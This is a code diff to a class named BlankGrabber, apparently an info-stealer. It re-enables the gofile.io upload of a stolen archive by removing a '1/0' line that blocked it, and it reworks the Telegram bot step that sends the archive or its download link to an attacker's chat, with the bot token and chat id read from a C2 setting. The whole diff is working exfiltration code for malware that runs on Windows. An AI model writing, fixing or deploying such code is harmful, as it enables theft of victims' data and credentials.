@@ -1548,7 +1548,6 @@ class BlankGrabber:
             http = PoolManager(cert_reqs="CERT_NONE")
 
             try:
-                1/0
                 server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors= "ignore"))["data"]["server"]
                 if server:
                     url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["downloadPage"]
@@ -1685,14 +1684,16 @@ class BlankGrabber:
                 fields = dict()
 
                 if url:
-                    payload["caption"] += "\n\nArchive : %s" % url
+                    payload["text"] = payload["caption"] + "\n\nArchive : %s" % url
+                    method = "sendMessage"
                 else:
                     fields["document"] = (filename, open(self.ArchivePath, "rb").read())
+                    method = "sendDocument"
                 
                 token, chat_id = Settings.C2[1].split('$')
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
-                http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
+                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
 
 if __name__ == "__main__" and os.name == "nt":
     Logger.info("Process started")
